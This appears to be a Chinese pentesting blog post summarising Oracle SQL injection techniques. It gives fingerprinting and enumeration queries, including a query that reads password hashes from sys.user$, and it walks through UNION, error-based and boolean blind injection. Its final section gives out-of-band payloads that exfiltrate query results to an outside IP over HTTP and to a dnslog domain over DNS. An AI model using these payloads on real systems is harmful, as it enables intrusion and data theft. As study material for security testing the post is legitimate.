---
date: 2019-01-04 20:23:35
title: SQL注入 tips(Oracle)
description: 前几天渗透测试时遇到了Oracle的注入，这里简单总结一下Oracle中的SQL注入常见的利用手法：联合查询注入、报错型注入、布尔型注入、无返回值的盲注
categories:
  - Pentest
tags:
  - SQL注入
  - oracle
---

### 0x00 判断数据库类型
* Oracle有一些自带的表：dual、user_tables
    * ```id=45 and (select count(*) from user_tables)>0--```
    * ```id=45 and (select count(*) from dual)>0--```

* 利用自带的一些函数：譬如utl_http.request 这些
* 利用Oracle的字符连接符：CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(49)||CHR(61)||CHR(49)

### 0x01 基本信息获取
* 查看sid
```
select instance_name from v$instance;
```

* 查看数据库版本：
```
select banner from v$version where rownum=1;
select banner from sys.v_$version where rownum=1;
```

* 查看用户：
```
select user from dual; --当前用户
select username from user_users; --当前用户
select username from all_users; --查看所有用户
select username from dba_users; --查看所有用户(需要有权限)
```

* 查看当前用户角色：
```
select role from session_roles;
```

* 查看数据库用户名和密码：
```
select name, password, astatus from sys.user$; --需要权限
```

* 通过注入获取数据
    ```
    --列database
    select global_name from global_name;
    select sys.database_name from dual;
    select name from v$database;
    select instance_name from v$instance;
    --列owner
    select distinct owner from all_tables;
    --列owner的tables
    select table_name from all_tables where owner='UTEST';
    --列tables的columns
    select column_name from all_tab_columns where table_name='TUSER';
    select column_name from all_tab_cols where table_name='TUSER';


    --列tablespace
    select tablespace_name from user_tablespaces;
    --列tablespace的tables
    select table_name from user_tables where tablespace_name='DB_TEST_DATA';
    --列tables的columns
    select column_name from user_tab_columns where table_name='TUSER';
    ```

### 0x02 UNION query注入

* 存在注入
![70](/img/post/20190103-162239.png)

* 判断列数
![40](/img/post/20190103-162620.png)
![80](/img/post/20190103-162720.png)

* 尝试union select
![60](/img/post/20190103-163005.png)
依次判断字段类型(下图判断出第二个字段是字符型)
![80](/img/post/20190103-163324.png)
![50](/img/post/20190103-163228.png)

* 得到表名  
得到表的个数
![75](/img/post/20190103-164019.png)
得到第一个表的表名
![75](/img/post/20190103-163610.png)
得到第二个表的表名
![75](/img/post/20190103-164519.png)

* 得到第一个表的字段
![80](/img/post/20190103-165302.png)

* 得到第一个表的数据
![80](/img/post/20190103-170336.png)

### 0x03 error-based注入
* ctxsys.drithsx.sn
![60](/img/post/20190104-160714.png)

* dbms_xdb_version.checkin
![80](/img/post/20190104-161325.png)

* dbms_xdb_version.makeversioned
![85](/img/post/20190104-161521.png)

* dbms_xdb_version.uncheckout
![85](/img/post/20190104-161727.png)

* dbms_utility.sqlid_to_sqlhash
![85](/img/post/20190104-161838.png)

* utl_inaddr.get_host_name(在11g以后需要是超级用户或已授予网络访问权限的用户才能使用)
![](/img/post/20190104-203238.png)

### 0x04 boolean-based blind注入
* case...when...
![65](/img/post/Xnip2019-08-12_11-12-32.png)
![65](/img/post/Xnip2019-08-12_11-13-46.png)

* decode

decode(条件，值1，值1结果，值2，值2结果，。。。值n，值n结果，默认值)

条件和那个值相等就返回那个值的结果
![65](/img/post/20190104-165737.png)
![65](/img/post/20190104-165817.png)

* instr

instr(字符串，子串)

从一个字符串中查找指定子串的位置，这里一直将位置置为1
![55](/img/post/20190104-201134.png)
![55](/img/post/20190104-201157.png)
![55](/img/post/20190104-201216.png)

### 0x05 无回显注入
* web服务接收结果
```
select * from utest.msg where id=2 and 1=utl_http.request('http://59.108.35.198:8888/'||(select user from dual));
```

* dns服务接收结果
```
select * from utest.msg where id=2 and (select utl_inaddr.get_host_address((select user from dual)||'.dnslog.wyb0.com') from dual) is not null;
```

* dns服务接收结果
```
select * from utest.msg where id=2 and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.dnslog.wyb0.com',81) from dual) is not null;
```


#### Reference(侵删)：
* [https://www.freebuf.com/articles/web/5411.html](https://www.freebuf.com/articles/web/5411.html?_blank)
* [https://www.iswin.org/2015/06/13/hack-oracle/](https://www.iswin.org/2015/06/13/hack-oracle/?_blank)
* [https://www.freebuf.com/column/146464.html](https://www.freebuf.com/column/146464.html?_blank)

